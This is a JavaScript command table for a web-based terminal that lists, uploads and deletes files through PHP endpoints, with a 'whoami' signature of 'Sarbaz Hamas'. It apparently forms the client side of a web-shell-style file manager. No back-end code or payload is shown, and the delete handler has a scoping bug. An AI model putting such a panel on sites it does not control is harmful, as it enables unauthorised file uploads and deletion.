var PROGAMS = {

  help: function(...a) {
    this.printa({
      "headers": ["command", "description"],
      "upload": ["file name code"],
      "clear": ["clear terminal"],
      "whoami": ["you"],
      "ls": ["show direction"],
      "cd": ["shell path"],
      "delete": ["file delete"]
    });
  },

  upload: function(...args) {
    const filename = args[0];
    const content = args[1];
    const formData = new FormData();
    formData.append('filename', filename);
    formData.append('content', content);
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'up.php', true);
    xhr.onload = () => {
      if (xhr.status === 200) {
        this.printa('Success:', xhr.responseText);
      } else {
        console.error('Error:', xhr.statusText);
        this.printa('Error:', xhr.statusText);
     }
    };

   xhr.send(formData);
  },
  clear: function(...a) {
    this.clear_terminal();
  },
  whoami: function(...a){
    this.printa("Sarbaz Hamas");
  },
  ls: function(...a){
  fetch('dir.php')
        .then(response => response.text())
        .then(data => {
            this.printa(data);
        })
        .catch(error => console.error('Error:', error));

  },
  delete: function(...args){
  const file = args[0];
  const xhr = new XMLHttpRequest();
            xhr.open('POST', 'del.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    this.printa(xhr.responseText);
                }
            };
            xhr.send('filename=' + encodeURIComponent(file));
  },
  cd: function(...a) {
   fetch('cd.php')
        .then(response => response.text())
        .then(data => {
            this.printa(data);
        })
        .catch(error => console.error('Error:', error));
  }
};
